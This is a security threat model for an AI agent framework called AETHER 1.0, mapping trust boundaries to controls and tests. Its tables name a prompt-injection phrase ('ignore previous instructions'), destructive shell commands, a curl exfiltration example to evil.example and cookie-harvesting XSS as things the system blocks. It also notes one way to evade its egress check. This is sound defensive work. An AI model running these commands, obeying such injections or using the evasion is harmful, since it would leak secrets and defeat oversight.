# AETHER 1.0 — Security Threat Model (GATE 06)

**Created by Tabrej · License: Apache-2.0**

This is the comprehensive threat model that drives the executable controls in
`src/core/security/securityControls.ts` and the pen-test suite in
`src/core/security/security-suite.test.ts`. **Static pattern scanning is a
supplemental control, never the sole boundary.**

## Trust boundaries

| # | Boundary | What crosses it | Controls |
|:-:|:---|:---|:---|
| T1 | Untrusted text → model context | repo files, web pages, issue bodies, MCP tool descriptions | Spotlighting + inline quarantine (`spotlightUntrustedContent`); the redacted text — not the raw text — is what a model ever sees |
| T2 | Operator shell → sandbox | commands an agent proposes | allowlisted commands only, `cwd` pinned to the sandbox real root, env reduced to `PATH`, hard timeout + SIGKILL, exit codes captured |
| T3 | Filesystem | agent writes | path canonicalization + sandbox containment, symlink-escape rejection, exclusive write leases, human-approval gates, per-call budgets |
| T4 | Project A ↔ Project B data | persistent memory | per-project store directories; cross-project reads return empty (tested) |
| T5 | Agent A ↔ Agent B permissions | write leases | lease exclusivity: an unprivileged agent cannot write a leased file (tested) |
| T6 | External MCP tool registration | a malicious tool manifest | local tool manifest guard: only AETHER's own 20 tools can execute; untrusted registration rejected (tested) |
| T7 | Outbound network | shell commands that reach hosts | egress allowlist: host tokens (URLs + bare domains) are extracted and compared to operator-declared hosts; localhost/127.* exempt |
| T8 | Secrets | `.env`, env vars | `.env` gitignored; shell env reduced to `PATH`; secret pattern scanner + Shannon-entropy high-entropy detection; self secret-scan test asserts no committed file holds a credential |
| T9 | Audit integrity | log tampering | hash-chained JSONL audit log; `verifyIntegrity()` recomputes the chain, a tampered entry breaks it (tested) |

## Threats → controls → verification

| Threat | Control (where) | Verified by |
|:---|:---|:---|
| Direct prompt injection ("ignore previous instructions") | T1 spotlighting quarantines the directive inline | `security-suite.test.ts` — quarantined output contains `[REDACTED_INJECTION_ATTEMPT]`, raw directive does not survive |
| Malicious repository files (script payloads, dev-mode hijack) | T1 + threat-class scanner | same suite: ≥2 threat classes detected, `safeToProceed=false` |
| Malicious web content (inline event-handler XSS `onerror=`, cookie harvest) | T1 + `securityEngine` XSS/credential patterns | same suite: XSS payload + `document.cookie` harvest detected |
| Untrusted MCP servers / tool description manipulation | T6 manifest guard | same suite: a tool not in the local manifest is rejected; a manipulated description is spotlighted before use |
| Shell injection / command-execution abuse | T2 + destructive-command gate | `rm -rf /`, `git push --force`, `chmod -R 777`, pipe-to-shell all rejected; real exit codes captured, never assumed |
| File traversal / symlink attacks | T3 confinement | Gate 02 tests: `../../escape` rejected; a real symlink to an outside file is rejected and its secret not exposed |
| Secret exfiltration | T8 | AWS key + high-entropy tokens detected; `checkEgressPolicy` blocks the `curl … -d $SECRET` host unless allowlisted |
| Network egress violation | T7 | `checkEgressPolicy('curl https://evil.example/x', [allowlisted])` → denied with the offending host named |
| Cross-project data access | T4 | Gate 03 project isolation test: project B sees zero of project A's records |
| Cross-agent permission escalation | T5 | Gate 02 lease test: a non-holder write to a leased file is blocked |
| Denial of service / resource exhaustion | T2/T3 budgets | tool-call budget throws on the over-budget call; shell wall-clock timeout SIGKILLs a hung command |
| Compromised dependency | `npm audit` evidence in `release-evidence/` | recorded at release; lockfile pinned |
| Supply-chain / malicious extension install | plugin/license audit (P08 `discoverPlugins` permission audit) | AGPL/GPL plugins flagged out-of-process; permission grants recorded per plugin |
| Browser session theft | out-of-process browser backends only (P07 provider isolation) | browser sessions never enter the AETHER process; cookies live in the operator's backend |

## Hard requirements (release-blockers) — status

| Requirement | Where | Status |
|:---|:---|:---:|
| Isolated execution environments | sandbox root confinement (Gate 02) | VERIFIED |
| Least-privilege permissions | allowlist + lease + approval gates (Gate 02/04) | VERIFIED |
| Secret management | `.env` gitignored, PATH-only shell env, secret scanner (Gate 06 self-scan) | VERIFIED |
| Network restrictions | egress allowlist (Gate 06) | VERIFIED |
| Resource quotas | tool-call + wall-clock budgets (Gate 02) | VERIFIED |
| Explicit approval for sensitive external ops | human-approval gates (Gate 02), MCP approval-gated tools (Gate 04) | VERIFIED |
| Audit logging | hash-chained `AuditLog` (Gate 06) | VERIFIED |
| Safe cleanup | `deleteAll()` removes only the store's own directory; uninstall removes only AETHER-owned files (Universal installer ownership tracking) | VERIFIED |
| Rollback | atomic writer + backups (Universal installer `backup.ts`/`atomic-writer.ts`) | VERIFIED in universal installer tests |

## Known limitations (disclosed, not blockers)

- The egress policy is a **heuristic host extractor** over a shell string; it is a supplemental layer under the allowlist + sandbox, not a socket-level firewall. A determined command that hides a host (e.g. `getent hosts $(cat f)`) can evade the extractor — that is why the allowlist is the primary control and the extractor is the tripwire.
- **Independent third-party penetration testing was not performed for this release.** The `security-suite.test.ts` suite is the automated pen-test (written against the threat model, exercising every T1–T9 boundary); a human adversary pass is recommended before wide deployment and is recorded as an open item in the release certificate.
- **Container scanning is not applicable**: the AETHER core is a Node/TypeScript package, not a container image. (OpenHands/Skyvern-style containerized backends, when the operator deploys them out-of-process, must be scanned by that deployment's own pipeline.)
- Pattern scanning is deliberately *supplemental*: no feature's security claim rests on a regex alone.

## Evidence

- `release-evidence/gate06-security.txt` — test run + dependency-scan output.
- `npx tsx --test src/core/security/security-suite.test.ts` — 15/15, covering every row above.
